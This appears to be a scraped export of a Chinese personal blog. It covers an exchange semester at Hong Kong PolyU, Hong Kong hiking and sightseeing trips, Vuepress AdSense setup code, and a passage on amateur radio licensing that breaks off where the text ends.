由于香港的入境事务处给学期交换生的签证不会超过6个月（通常是「5个月」或者是到当年的12月31日，但签注一般会在7月末才会发出，所以给予的最长的逗留时间是不可能超过180天的），交换生也就不必（实际上也不能，人事登记处的职员不接受）办理香港身份证了。\n不过由我们没有香港身份证，被路上的警察截查时理论上需要我们出示港澳通行证+进入许可，但一般情况下给警察看港澳通行证和进入许可与入境小票的扫描件/照片就可以了。\n学校 港理工位于红磡，通过横跨红磡海底隧道的天桥和红磡站相连。其交通非常方便，不过学校的面积较小，大概相当于半个南科大的大小。\n天桥 李兆基楼 由于我在南科大的学分已经足够，在港理工，我只选择了三门课程（共9学分，这也是入境处要求选的最低学分），包括一门人文课和两门专业课程。\n港理工在这个学期刚刚恢复了Hybrid Teaching Mode，也就是同学可以自选线上或线下上课。我观察到的有趣现象是由于大三和大四的本地学生通常不获分配宿舍，每天如果来学校则需要花费大量的时间通勤，因此他们大都会选择线上参与课程。在我选择的三门课中，非本地生占绝大多数的粤语课程已基本恢复线下教学，每节课只有1-2人由于没有前往香港而被迫线上。一门算法课程则维持Hybrid模式，不过由于师生互动较少，实际线下参与课程的同学仅有3-4人（整个教学班有40人），而另一门数据结构课程则更是将正课直接以预录制视频的形式呈现，只有答疑课程是以Hybrid模式进行的。不管是线上还是线下，我所选择课程老师的教学水平大都令人满意，就算是将正课直接以预录制视频形式呈现的数据结构课程，任课老师也是有在认真制作视频和内嵌的习题与课外阅读，而不是较为传统的播放静态幻灯片（对比本校在2020年春季的线上教学情况）。\n教室 我选择的粤语课程以「用粤语演讲」的形式代替了期末考试，而另外两门专业课程则由于选择线上的学生太多，均改为了线上考试，其中算法课是较为传统的老师下发试卷-同学自行答题-自行上传Blackboard，而数据结构课程则使用了乱序的选择题和填空题通过Blackboard进行了期末考试。\n依照个人的感觉，港理工的专业课程难度略低于南科大。同时，港理工的课程一般也不会像内地的大学一样建许多的课程群，教室和同学大都通过bb联系和下发/提交材料，相对比课程群方便很多。\n宿舍与校内餐饮 红磡宿舍 所有完成疫苗接种的交换生都被分配到了红磡宿舍。从红磡宿舍走到港理工主校园大约需要10分钟，中间需要穿过红磡站。\n宿舍房间 红磡宿舍一共有21层（香港的地面层算Ground，不算层数），21F为职员宿舍，19-20F是研究生宿舍，3-18F都是本科生宿舍。宿舍的结构是两人间，每两间宿舍共用一个洗手间和淋浴间。宿舍里的空调还是比较旧的内外一体机，不能定时，开启的时候噪声较为可观，而且费电（每12个小时大概需要10HKD）。宿舍的每层楼中间有一个中堂，在疫情之前经常用来办活动。不过由于599G，目前宿舍内也不能进行超过4人的聚集，中堂里平时就只有聚在一起自习和吃饭的人了。中堂里还提供了收费的洗衣机和烘干机（洗一次6HKD，烘干每6分钟1HKD），以及电磁炉，微波炉和烤箱等厨房用品。\n电梯内的宣传栏 中堂 宿舍和校园内均提供无线网络和有线网络（百兆网口），均限速100Mbps，没有公网IPv4，没有IPv6，出口是AS4616。\n生活 下面的地图里列出了宿舍周边的餐厅，超市，银行等常见的生活设施。（地图链接）\nCOVID 香港的疫情管控较好，整个2021年秋季几乎没有出现社区确诊和爆发。不过港府强制市民在非郊野公园和私人地方的地方戴口罩（包括学校校园和宿舍房间之外的地方，这点在内地的学校似乎没有强制执行），进入餐厅需要扫「安行出行」，部分区域可能还需要出示疫苗证明（实际上查询疫苗接种的责任在餐厅，所以内地的纸质证明甚至是健康码上的疫苗记录一般都会被承认）。\nM+博物馆外的安心出行二维码 餐饮 学校校园内的餐厅由Asia Pacific Catering运营，Asia Pacific Catering是大家乐经营的饭堂品牌，所以餐厅里的菜品和大家乐类似。不过可能是由于学校有补贴，同样的菜在学校食堂的价格，大约是大家乐的7折左右。正常情况下，每餐的价格大约落在25-35HKD。宿舍楼下也有一个餐厅（非大家乐运营），不过不是特别好吃。\n从学校到宿舍的路上会经过港铁红磡站（二楼有一个美食广场）和置富都会（内有茶餐厅，意大利粉，东南亚菜和酸菜鱼）。宿舍的东北面距离黄埔花园只有一条马路，黄埔花园一侧也有相当多的选择（可参考上方的地图）。由于香港外卖外送费较高（20HKD起步），而且也只能送到宿舍楼下（走过去也就十分钟），所以我们从来没点过外卖。\n支付方式 由于港府的消费券计划，大部分的商场，超市和餐厅都已经普及了各种电子支付方式。不过交通和便利店的快捷支付仍然是以八达通为主（港理工寄信的时候会附赠一张不可退卡的游客版八达通，也可以自行购买或者在iPhone和华为上开卡）。其他的商场超市餐厅，甚至政府服务部门大都会使用移动POS机来结账，理论上这些机器支持微信，支付宝，信用卡/借记卡（Visa/Master/银联）和云闪付，不过一般只有大型商场和政府机构会启用POS机的全部收款方式，一些小餐厅就只会启用支付宝和微信收款了。支付宝和微信的付款码均是内地/香港通用的，付款港币时会自动按照当时的银行汇率扣款人民币。\n景点？ 可参考下方地图，也可参考我博客中带HK tag的文章。\n其他 银行账户与本地信用卡 香港的「四大」银行（BOCHK中银香港，HSB恒生，HSBC汇丰和SC渣打）均愿意为交换生开银行户口，持港澳通行证，内地身份证，进入许可和学生证即可。不过其中只有HSB和HSBC愿意给交换生批信用卡（剩下的几间银行会要求香港身份证才能办信用卡，但交换生并没有，与这篇文章提到的情况基本一致）。其中HSBC的学生信用卡有效期是正常的5年，而HSB的信用卡有效期和签证有效期一致，在这里并不推荐办理。不过办理本地银行卡的用处，主要也只有避免取款时和消费时的货币转换费/手续费了。\n电讯 许多服务会要求香港手机号（这点和部分大陆服务只能用大陆手机号注册类似），学期交换时办理一张储值卡即可。储值卡可以选择选择包年的流量卡或普通的预存储值卡（ClubSIM或3HK DIYSIM）。香港的流量单价至今仍然较高，约为10HKD/G，大部分的预存储值卡每个月会扣除3HKD的行政费（月租），并且需要每180天充值一次才不会失效。\n总结 和我一起来到港理工交换的同学总喜欢在句子前加上「来都来了」。虽在疫情和香港「新常态」的双重夹击下，交换的体验不比从前，现时的香港也已经不再是21世纪10年代的那个香港。但在疫情之下，这样的经历也弥足珍贵。希望疫情能早日流感化或结束，以让我们能再次走出国门吧。\n","permalink":"https://blog.sparktour.me/posts/2022/01/03/my-exchange-life-in-polyu/","summary":"\u003cp\u003e从小在深圳长大的我从2010年代开始，一直保持着每年至少前往香港一次的纪录。本以为这段纪录将止于20世纪的第二个十年（如果把2020年算进21世纪的第一个十年），但凑巧赶上学校在疫情席卷全球一年之后再度开放了学期与学年的交换交流项目项目。当时可供选择的项目主要集中在美国，加拿大，英国，香港和新加坡，基于我们的交流时间仅为一个学期，而疫情下从英国，北美，新加坡回国所具有的复杂性和不确定性，香港由于返回内地不会有任何航班限制，以及传了半年\u003cdel\u003e但却没通成的\u003c/del\u003e通关消息，也成为了一个疫情下相对可控的交流目的地。\u003c/p\u003e","title":"My Exchange life in PolyU"},{"content":"所有照片按照时间排列。由于嫌麻烦，照片都没有做过任何后期处理，权当是记录一下我的2021吧。\n2021年1月1日，早晨的塘朗地铁站 4月，超算机房停电后的应急措施 5月，南科大二期工程 5月，飞机上所见的晚霞（SZX） 5月，南科大二期工程的废料堆放场 5月，学校门外的自动驾驶试验车 6月，集体核酸检测中的试管 7月，腾讯滨海大厦内不同的QQ公仔 7月，腾讯滨海大厦夜景 8月，深圳湾口岸前往香港的队伍 9月，红磡站，仍在显示城际直通车的显示器 9月，人行天桥铁丝网后的干诺道中 9月，昂坪360 10月，南丫岛上的庆祝国庆旗 10月，香港迪士尼灯光秀 10月，黄埔的一处报刊亭 11月，M+博物馆外巨大的「安心出行」二维码 11月，立法会选举广告 12月，尖沙咀的圣诞灯饰 12月19日，「免费搭乘头等舱」 12月，入境处职员正在检查进入深圳湾口岸人士的安心出行 12月，深圳的隔离酒店前台 ","permalink":"https://blog.sparktour.me/posts/2021/12/31/2021-in-photos/","summary":"\u003cp\u003e\u003cem\u003e所有照片按照时间排列。由于\u003cdel\u003e嫌麻烦\u003c/del\u003e，照片都没有做过任何后期处理，权当是记录一下我的2021吧。\u003c/em\u003e\u003c/p\u003e\n\u003cp\u003e\u003cfigure\u003e\n    \u003cimg loading=\"lazy\" src=\"https://assets.sparktour.me/img/blog/2021/2021-in-photos/202101-morning-tl.jpg\" alt=\"2021年1月1日，早晨的塘朗地铁站\"  /\u003e\n    \u003cfigcaption\u003e2021年1月1日，早晨的塘朗地铁站\u003c/figcaption\u003e\n\u003c/figure\u003e\n\u003c/p\u003e\n\u003c!-- more --\u003e\n\u003cp\u003e\u003cfigure\u003e\n    \u003cimg loading=\"lazy\" src=\"https://assets.sparktour.me/img/blog/2021/2021-in-photos/202104-power-fault.jpg\" alt=\"4月，超算机房停电后的应急措施\"  /\u003e\n    \u003cfigcaption\u003e4月，超算机房停电后的应急措施\u003c/figcaption\u003e\n\u003c/figure\u003e\n\u003c/p\u003e","title":"照片里的2021"},{"content":"不走回头路行大帽山\u0026amp;免费乘车日 港府于立法会投票日「要求」各大运输公司提供了免费公交+地铁，这当然就是鼓励大家出去玩啦。在体验免费乘车的同时，我们也寻找了一条不走回头路的大帽山行山路线。全程一共10公里，上山4.8公里，下山5.2公里，累计高度升降超过了1400米，算是一条有一些难度的路线（尤其是下山这一段）。 麦理浩径位置标牌 行山路线图 上山段 免费港铁 免费港铁之闸机 从荃湾西站出发，至如心广场（下面的地图中，51路的始发站是错的！51路的始发站不是荃湾西站的公共运输交汇处，是如心广场巴士总站！），乘坐九巴51线即可到达大帽山郊野公园的入口（于「大帽山郊野公园」站下车，此时的海拔约450米）。大帽山道的入口有一个烧烤场和一个卖水的士多。\n被纸遮住的读卡器 下车后，往回走大约一两百米即可看到山路的入口（大帽山道）。此处可以选择走台阶，或者直接走马路（马路和台阶基本并行，可以随时换路）。\n「禁止学车」 大帽山道全程都是一车道宽度的水泥路，道路状况非常良好。从巴士站上到雷达站大约花费了不到2个小时。\n大帽山道 新界（可以看到石岗机场），远处是深圳湾 盘山路和港岛青衣 山道上的黄牛 青衣 麦理浩径位置标牌 雷达与微波天线 气象站 行人能够走到的最高处是大帽山雷达站的大门外（海拔接近900米），门外立了一块禁止拍照的牌子，具体的内部建筑可以参考HK01的这篇文章。\n「禁止摄影绘图」 下山段 在这道铁闸旁边有一座小桥，向此方向走即可从另一段（林锦公路方向下山）。\n桥 下山路段从海拔900米到650米左右均为水泥行车路，不过坡度比大帽山道陡了不少。随后在水泥路消失的路口沿着路牌转入梧桐寨方向继续行走大约2小时即可下到山底。不过下山的梯级均为为用山石堆成的简易道路，而且需要从海拔600米下降到100米左右，因此相当对膝盖和脚相当不友好。\n林锦公路方向 梧桐村寨 随后沿着村道下到林锦公路，坐64K大巴或25K小巴到太和站即可坐地铁回屋了。\n杂图 （北部）都会区未动，炒房先行 免费一等座 免费一等座（内部） 选情告急 ","permalink":"https://blog.sparktour.me/posts/2021/12/19/tai-mo-shan-hiking-2021/","summary":"\u003ch1 id=\"不走回头路行大帽山免费乘车日\"\u003e不走回头路行大帽山\u0026amp;免费乘车日\u003c/h1\u003e\n\u003cp\u003e港府于立法会投票日「要求」各大运输公司提供了\u003ca href=\"https://www.info.gov.hk/gia/general/202112/10/P2021121000488.htm\"\u003e免费公交+地铁\u003c/a\u003e，这当然就是鼓励大家出去玩啦。在体验免费乘车的同时，我们也寻找了一条不走回头路的大帽山行山路线。全程一共10公里，上山4.8公里，下山5.2公里，累计高度升降超过了1400米，算是一条有一些难度的路线（尤其是下山这一段）。\n\u003cfigure\u003e\n    \u003cimg loading=\"lazy\" src=\"https://assets.sparktour.me/img/blog/tai-mo-shan-hiking-2021/maclehose-trail-m148.jpg\" alt=\"麦理浩径位置标牌\"  /\u003e\n    \u003cfigcaption\u003e麦理浩径位置标牌\u003c/figcaption\u003e\n\u003c/figure\u003e\n\u003c/p\u003e\n\u003c!-- more --\u003e\n\u003ch2 id=\"行山路线图\"\u003e行山路线图\u003c/h2\u003e\n\u003ciframe src=\"https://www.google.com/maps/d/embed?mid=1svKbRUoD3YJRE48MnsolnpiWjN4ElR__\u0026ehbc=2E312F\u0026ll=22.420480882974196%2C114.11884500000002\u0026z=14\" width=\"640\" height=\"480\"\u003e\u003c/iframe\u003e\n\u003ch2 id=\"上山段\"\u003e上山段\u003c/h2\u003e\n\u003cp\u003e\u003cfigure\u003e\n    \u003cimg loading=\"lazy\" src=\"https://assets.sparktour.me/img/blog/tai-mo-shan-hiking-2021/free-mtr-gate.jpg\" alt=\"免费港铁\"  /\u003e\n    \u003cfigcaption\u003e免费港铁\u003c/figcaption\u003e\n\u003c/figure\u003e\n\u003c/p\u003e\n\u003cp\u003e\u003cfigure\u003e\n    \u003cimg loading=\"lazy\" src=\"https://assets.sparktour.me/img/blog/tai-mo-shan-hiking-2021/free-mtr.jpg\" alt=\"免费港铁之闸机\"  /\u003e\n    \u003cfigcaption\u003e免费港铁之闸机\u003c/figcaption\u003e\n\u003c/figure\u003e\n\u003c/p\u003e\n\u003cp\u003e从荃湾西站出发，至如心广场（\u003cstrong\u003e下面的地图中，51路的始发站是错的！51路的始发站不是荃湾西站的公共运输交汇处，是如心广场巴士总站！\u003c/strong\u003e），乘坐九巴51线即可到达大帽山郊野公园的入口（于「大帽山郊野公园」站下车，此时的海拔约450米）。大帽山道的入口有一个烧烤场和一个卖水的士多。\u003c/p\u003e","title":"不走回头路行大帽山\u0026免费乘车日"},{"content":"之前以为去大美督能干的事情只有行山和看水坝，淡水湖，没想到还有脚踏船可以划，属实是找回了小时候在公园划船的感觉。\n前往大美督（大尾篤） 从大埔墟站乘坐九巴75K（仅限周末）坐到底即可。如果是平日的话，可以考虑20C或者20P小巴。\n船湾淡水湖水坝 下车之后沿着指示牌走即可，整条水坝都没有任何树木，在晴天非常晒，记得涂防晒霜。\n入口 望向海边的一侧 望向淡水湖的一侧 水坝上的道路 自行车靠左 租艇 码头旁边有两家租艇商家，分别是濱景租艇和生利租艇，两者提供的都是脚踏船，形状各有特色（濱景是天鹅，生利是小黄鸭，具体的样子可以看这里）。不过濱景租艇略微便宜一些，价格大约是120HKD/小时，上船之前要交300HKD押金，船可以一直租到下午六点之前~~（只要你踩的动）~~。船提供救生衣，有棚子。\n一些题外话，我们发现两家租艇提供的船都是在在公园/湖泊使用的（见下图），理论上并不太适合在海湾里划。\nboat 码头 码头 划船路线 上面的这条路线我们划了正好2小时。\n在海湾里划脚踏船的最大问题还是海湾相对公园的内湖，会有其他快艇经过造出的浪和风吹的浪，有时风吹的速度甚至和人踩脚踏船的速度差不多，这也是为什么我们经过了马屎洲的海角之后就没敢继续往前划的原因：前面就是完全的开放海域了，船相对来说会难控制很多。不过在海里划船还是比公园有意思多了，至少不会出现划了一个小时就划完一圈，没处可去的情况。\n船上 天鹅头 回程时看到的大小游艇 yacht 参考 風和日麗坐船仔-大尾督line friend之旅 (含超詳細介紹) - U Blog (ulifestyle.com.hk) ","permalink":"https://blog.sparktour.me/posts/2021/11/06/boating-in-plover-cove/","summary":"\u003cp\u003e之前以为去大美督能干的事情只有行山和看水坝，淡水湖，没想到还有脚踏船可以划，\u003cdel\u003e属实是找回了小时候在公园划船的感觉\u003c/del\u003e。\u003c/p\u003e\n\u003c!-- more --\u003e\n\u003ch2 id=\"前往大美督大尾篤\"\u003e前往大美督（大尾篤）\u003c/h2\u003e\n\u003cp\u003e从大埔墟站乘坐\u003cstrong\u003e九巴75K\u003c/strong\u003e（仅限周末）坐到底即可。如果是平日的话，可以考虑20C或者20P小巴。\u003c/p\u003e","title":"船湾淡水湖大坝\u0026划脚踏船"},{"content":"为了给同学的手机激活跨境漫游服务，近日笔者找时间又去了一次马草垄（上一次已经是两年之前了）。由于封关的影响，和2019年8月相比，去马草垄的人明显变多了。前往马草垄的方式和上一次略有不同，这次笔者是在上水换乘的51B小巴前往的，相比19年走路两个小时，此次从上水前往马草垄只花了半个小时左右。\n上水站，因为封关这里变成了东铁线的北向终点站，站台上空无一人 车头，站台上有9卡和12卡的停车标记 上水广场和公共交通交汇处 「坚守一国两制，香港繁荣进步」 51B小巴，分段收费。如果只坐到信义新村，记得将刷卡机上的金额调整成6.9再刷 料壆路 山上拍照的游人，背景是罗湖 无人机和赛格大厦（已经拆掉了楼顶的铁塔） 地王大厦 警岗 福田日落 长富中心和落马洲车站（下方），背景能看到一点蛇口港 罗湖和福田 罗湖特写 日落 日落之后 罗湖中心区 罗湖口岸（下方）和梧桐山（远处的山顶） 信义新村巴士站的站牌 合作社 东铁线 番外——马草垄的山火 在回看马草垄的卫星图时，笔者发现在港府2021年拍摄的马草垄卫星图中，整座山包都没有任何植被覆盖。\nIMG_60F98F4D83B2-1 而查阅google在20年11月拍摄的卫星地图，整座山包还是绿的。\n相信上面的山火痕迹和2020年12月31日的这次山火有关。不过也不得不感叹植被恢复的速度，大半年之后再去就已经看不出山火的痕迹了。\n","permalink":"https://blog.sparktour.me/posts/2021/09/22/visit-ma-tso-lung-again-2021/","summary":"\u003cp\u003e为了给同学的手机激活跨境漫游服务，近日笔者找时间又去了一次马草垄（上一次已经是\u003ca href=\"https://blog.sparktour.me/posts/2019/09/09/trip-to-border-of-sz-and-hk/\"\u003e两年之前\u003c/a\u003e了）。由于封关的影响，和2019年8月相比，去马草垄的人明显变多了。前往马草垄的方式和上一次略有不同，这次笔者是在上水换乘的\u003ca href=\"https://hkbus.fandom.com/wiki/%E6%96%B0%E7%95%8C%E5%B0%88%E7%B6%AB%E5%B0%8F%E5%B7%B451B%E7%B7%9A\"\u003e51B小巴\u003c/a\u003e前往的，相比19年走路两个小时，此次从上水前往马草垄只花了半个小时左右。\u003c/p\u003e\n\u003c!-- more --\u003e\n\u003cp\u003e\u003cfigure\u003e\n    \u003cimg loading=\"lazy\" src=\"https://assets.sparktour.me/img/blog/visit-ma-tso-lung-again-2021/sheung-shui-platform.jpg\" alt=\"上水站，因为封关这里变成了东铁线的北向终点站，站台上空无一人\"  /\u003e\n    \u003cfigcaption\u003e上水站，因为封关这里变成了东铁线的北向终点站，站台上空无一人\u003c/figcaption\u003e\n\u003c/figure\u003e\n\u003c/p\u003e","title":"再行马草垄"},{"content":"在 Vuepress 2 中使用 Google Adsense 并配置自适应加载 迫于服务器续费的压力，最近抽时间和同学一起在社团运营的vuepress中配置了Google Adsense广告，并失陪了微信小程序，令广告只在非小程序环境下加载（由于小程序对域名备案的要求，adsense广告是无法在小程序的webview里面显示，强行显示还会造成小程序直接被「配置业务域名」的弹窗覆盖）。\n配置Adsense的自适应加载广告 可参考 https://github.com/SUSTech-CRA/sustech-online-ng/blob/master/docs/.vuepress/public/wx_helper.js#L81-L100 ：\nfunction isInWechatMP() { return navigator.userAgent.match(/miniprogram/i) || window.__wxjs_environment === \u0026#39;miniprogram\u0026#39;; }; function load_adsense() { console.log(\u0026#34;判断环境，加载 adsense\u0026#34;) if (isInWechatMP() === false) { console.log(\u0026#34;非小程序环境，加载\u0026#34;); var oScript = document.createElement(\u0026#34;script\u0026#34;); oScript.src = \u0026#34;https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\u0026#34;; oScript.setAttribute(\u0026#34;async\u0026#34;, \u0026#34;\u0026#34;); oScript.setAttribute(\u0026#34;data-ad-client\u0026#34;, \u0026#34;ca-pub-12345678\u0026#34;); document.head.appendChild(oScript); // \u0026lt;script data-ad-client=\u0026#34;ca-pub-12345678\u0026#34; async src=\u0026#34;https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; } else { console.log(\u0026#34;小程序环境，跳过\u0026#34;); } } setTimeout(\u0026#34;load_adsense()\u0026#34;, 500); 首先通过函数isInWechatMP，通过判断User Agent来判断目前是否处在小程序的环境中。 如果判断是小程序环境，执行load_adsense，在DOM上引入Adsense的脚本。 配置Adsense广告单元 在注册Adsense账户之后，google会给用户提供一段类似如下结构的代码：\n\u0026lt;script async src=\u0026#34;https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-12345678\u0026#34; crossorigin=\u0026#34;anonymous\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;ins class=\u0026#34;adsbygoogle\u0026#34; style=\u0026#34;display:block; text-align:center;\u0026#34; data-ad-layout=\u0026#34;in-article\u0026#34; data-ad-format=\u0026#34;fluid\u0026#34; data-ad-client=\u0026#34;ca-pub-12345678\u0026#34; data-ad-slot=\u0026#34;12345678\u0026#34;\u0026gt;\u0026lt;/ins\u0026gt; \u0026lt;script\u0026gt; (adsbygoogle = window.adsbygoogle || []).push({}); \u0026lt;/script\u0026gt; 随后可以根据上面的代码，建立一个component：\n\u0026lt;template\u0026gt; \u0026lt;div class=\u0026#34;container\u0026#34;\u0026gt; \u0026lt;ins class=\u0026#34;adsbygoogle\u0026#34; style=\u0026#34;display:block; text-align:center;\u0026#34; data-ad-layout=\u0026#34;in-article\u0026#34; data-ad-format=\u0026#34;fluid\u0026#34; data-ad-client=\u0026#34;ca-pub-12345678\u0026#34; data-ad-slot=\u0026#34;12345678\u0026#34;\u0026gt;\u0026lt;/ins\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;script\u0026gt; export default { name: \u0026#34;adsense-inline\u0026#34;, mounted() { this.adsenseAddLoad(); }, methods: { adsenseAddLoad() { let inlineScript = document.createElement(\u0026#34;script\u0026#34;); inlineScript.type = \u0026#34;text/javascript\u0026#34;; inlineScript.text = \u0026#39;(adsbygoogle = window.adsbygoogle || []).push({});\u0026#39; document.getElementsByTagName(\u0026#39;body\u0026#39;)[0].appendChild(inlineScript); } } } \u0026lt;/script\u0026gt; 把原来的html片段中的脚本改为函数，塞在脚本里面，并在config.js里面导入组件：https://github.com/SUSTech-CRA/sustech-online-ng/blob/master/docs/.vuepress/config.js#L111\n[ \u0026#39;@vuepress/register-components\u0026#39;, { components: { Adsense_unit: path.resolve(__dirname, \u0026#39;./components/adsense-inline-article.vue\u0026#39;), // componentsDir: path.resolve(__dirname, \u0026#39;./components\u0026#39;) }, }, ] 在文章中插入广告单元 在markdown中插入以下标签即可：\n\u0026lt;Adsense_unit\u0026gt; \u0026lt;/Adsense_unit\u0026gt; 渲染之后，插入标签的位置就会显示广告了。\n具体的广告效果可以在 sustech.online/#关于广告 的上方进行查看。\n","permalink":"https://blog.sparktour.me/posts/2021/09/20/google-adsense-vuepress-2-wxapp/","summary":"\u003ch1 id=\"在-vuepress-2-中使用-google-adsense-并配置自适应加载\"\u003e在 Vuepress 2 中使用 Google Adsense 并配置自适应加载\u003c/h1\u003e\n\u003cp\u003e迫于服务器续费的压力，最近抽时间和同学一起在社团运营的vuepress中配置了Google Adsense广告，并失陪了微信小程序，令广告只在非小程序环境下加载（由于小程序对\u003ca href=\"https://developers.weixin.qq.com/miniprogram/dev/framework/ability/domain.html\"\u003e域名备案\u003c/a\u003e的要求，adsense广告是无法在小程序的webview里面显示，强行显示还会造成小程序直接被「配置业务域名」的弹窗覆盖）。\u003c/p\u003e","title":"在 Vuepress 2 中使用 Google Adsense 并配置自适应加载"},{"content":"西高山位于港岛的太平山旁边，高494米，理论上是香港第四高的山峰。不过由于公共交通可达的「山顶」区域的高度也已经有大约380米，真正需要爬的路段只有100余米，相对来说是很轻松了。同时，由于山顶缆车在2021年6-12月都在维修，上山的公共交通只剩下巴士，山顶的客流也少了很多，爬山也更加清静一些。\n上山 巴士站 从港铁站金钟站C1出口出发，可以坐15或X15上山*（巴士站不在公共运输交汇处，在马路边上）*。两者价格一样，X15的路线更短，会略快一些，但班次比15更少。\n15 https://goo.gl/maps/uvAVBGQQvk6NRPPY8\nX15 https://goo.gl/maps/7scNqDUvRPh5csF57\n行山 从山顶巴士站出来之后，沿夏力道步行不到2公里（这段都是平路），就能看见上山台阶的入口。台阶大约500级，路窄但是坡度尚可接受，大约半小时就能爬上山顶。之后在山顶上等日落即可（山顶上没有很多遮阴和坐的地方，可以考虑稍晚一些，在日落前一个半小时上山）。\n路线图：https://www.google.com/maps/d/u/0/edit?mid=1aBFWFxdR_eYchTc4-Zj6QGvbAHjJ6_nZ\u0026amp;usp=sharing\n夏力道上的野猪 登顶小路，路况相当不错，只是比较窄 登顶台阶 山顶的标牌，标牌下面的日期上可以自行更改的 往回看台阶 观景台和三角测量站 港岛和西九龙 日落时的港岛和西九龙 南港岛和南丫岛 云和山顶建筑群 落日 日落，可以看到还是有一些雾霾 卢吉道观景台 下山之后往卢吉道走大约1公里即可看到。Google地图上指引了两个观景台（在上面的地图中有进行标注），效果都不错。\n西九龙，可以音乐会看见高铁站 拍摄夜景的最好时机是日落之后的半个小时，再晚天空暗下来之后，拍出来的照片颜色就不是蓝色的了。\n西侧的观景台 东侧的观景台，视角更接近媒体上常见的「香港」 随后一直沿着卢吉道走，就可以走会山顶广场，搭乘15/X15下山即可返回金钟。\n山顶广场 参考 【郊悠遊】西高山：登500級樓梯看無限好夕陽（附路線） - 體路 Sportsroad ","permalink":"https://blog.sparktour.me/posts/2021/09/18/mount-high-west-hiking/","summary":"\u003cp\u003e西高山位于港岛的太平山旁边，高494米，理论上是香港第四高的山峰。不过由于公共交通可达的「山顶」区域的高度也已经有大约380米，真正需要爬的路段只有100余米，相对来说是很轻松了。同时，由于山顶缆车在2021年6-12月都在\u003ca href=\"https://www.hk01.com/%E8%A6%AA%E5%AD%90/628112/\"\u003e维修\u003c/a\u003e，上山的公共交通只剩下巴士，山顶的客流也少了很多，爬山也更加清静一些。\u003c/p\u003e","title":"西高山行山与港岛夜景"},{"content":"飛機維修區看日落 sunset2 香港机场的二号客运大楼曾经有一个名为航空探知馆的飞机观赏区，可以在客运大楼的楼顶观看降落和起飞的飞机，可由于二号客运大楼的重建，航空探知馆也随之不复存在。目前，于香港机场看到飞机的最方便的方式就仅剩飞机维修区附近的一段南环路了。\n前往 可从东涌公共交通交汇处坐S52前往飞机维修区，随后往回走即可。\nS52巴士 需要注意的是，南环路只沿着07R/25L（南侧）这条跑道铺设，07L/25R（北侧）这条跑道外的北环路就位于机场禁区之中，无法到达了。\n「机场禁区，严禁擅闯，违者会被检控」 一些图片 拍摄飞机之前，推荐使用flightrader24提前查看起飞/降落的飞机。\n防波堤 拍摄飞机的最好地点是07R/25L跑道的末端，如果飞机在这条跑道向西起飞，就能拍出如下图的飞机（图是手机的标准焦段（等效28mm）拍的）。\n国泰的A330 如果遇到了飞机在这条跑道上向东起飞，就只能隔着铁丝网看飞机转向了。\n新航的747 亚航 日落，远处是珠海中山一带，能隐约看见一段港珠澳大桥 在日落之后，可以通过设置在海上的近进灯判断07R/25L跑道是否会有飞机向西起飞/从西边降落：如果近进灯在闪，说明这条跑道目前正用于向西起飞/从西边降落的飞机。\n日暮，左侧是07L/25R的进近灯 返程 看完日落之后，可以一直沿着南环路向客运大楼的方向走，一直走到「政府飞行服务队」站即可坐S52返回东涌。这一段路都沿着K滑行道走，可以听到很大的飞机引擎声。\n政府飞行服务队 ","permalink":"https://blog.sparktour.me/posts/2021/09/09/watching-sunset-at-hkg-airport/","summary":"\u003ch1 id=\"飛機維修區看日落\"\u003e飛機維修區看日落\u003c/h1\u003e\n\u003cp\u003e\u003cfigure\u003e\n    \u003cimg loading=\"lazy\" src=\"https://assets.sparktour.me/img/blog/watching-sunset-at-hkg-airport/sunset2.jpg\" alt=\"sunset2\"  /\u003e\n    \u003cfigcaption\u003esunset2\u003c/figcaption\u003e\n\u003c/figure\u003e\n\u003c/p\u003e\n\u003cp\u003e香港机场的二号客运大楼曾经有一个名为\u003ca href=\"https://zh.wikipedia.org/wiki/%E8%88%AA%E7%A9%BA%E6%8E%A2%E7%9F%A5%E9%A4%A8\"\u003e航空探知馆\u003c/a\u003e的飞机观赏区，可以在客运大楼的楼顶观看降落和起飞的飞机，可由于二号客运大楼的重建，航空探知馆也随之不复存在。目前，于香港机场看到飞机的最方便的方式就仅剩飞机维修区附近的一段南环路了。\u003c/p\u003e\n\u003c!-- more --\u003e\n\u003ch2 id=\"前往\"\u003e前往\u003c/h2\u003e\n\u003cp\u003e可从东涌公共交通交汇处坐S52前往飞机维修区，随后往回走即可。\u003c/p\u003e\n\u003ciframe src=\"https://www.google.com/maps/embed?pb=!1m27!1m12!1m3!1d29532.371233480382!2d113.90182587922119!3d22.295165960864338!2m3!1f0!2f0!3f0!3m2!1i1024!2i768!4f13.1!4m12!3e3!4m5!1s0x3403e2adec4694d1%3A0xc7290ee490944c42!2sTung%20Chung!3m2!1d22.2873743!2d113.9425086!4m4!1s0x3403e2669a28c2d3%3A0xee5f2f83afd26e9b!3m2!1d22.2952303!2d113.89420319999999!5e0!3m2!1sen!2shk!4v1631549577827!5m2!1sen!2shk\" width=\"600\" height=\"450\" style=\"border:0;\" allowfullscreen=\"\" loading=\"lazy\"\u003e\u003c/iframe\u003e\n\u003cp\u003e\u003cfigure\u003e\n    \u003cimg loading=\"lazy\" src=\"https://assets.sparktour.me/img/blog/watching-sunset-at-hkg-airport/S52.jpg\" alt=\"S52巴士\"  /\u003e\n    \u003cfigcaption\u003eS52巴士\u003c/figcaption\u003e\n\u003c/figure\u003e\n\u003c/p\u003e\n\u003cp\u003e需要注意的是，南环路只沿着07R/25L（南侧）这条跑道铺设，07L/25R（北侧）这条跑道外的北环路就位于机场禁区之中，无法到达了。\u003c/p\u003e","title":"飛機維修區看日落"},{"content":"持有大陆无线电执照香港申請業餘電台牌照／操作授權證明 根据香港通訊事務管理局的规定，持有「中華人民共和國工業和信息化部發出的業餘無線電台執照和由中國無綫電協會發出的業餘電台操作技術能力證明－業餘電台操作證書 （操作證明）」的人士可以免试申请香港的業餘電台牌照／操作授權證明。而香港的操作授權證明也能被欧洲多个国家承认。\n申请 在香港政府一站通上面填表即可： https://eform.one.gov.hk/form/oca009/tc/\n填表时，需要提交以下资料：\n大陆身份证 港澳通行证 无线电台执照（一张绿色的纸） 業餘電台操作技術能力證明（卡片） 香港的住址 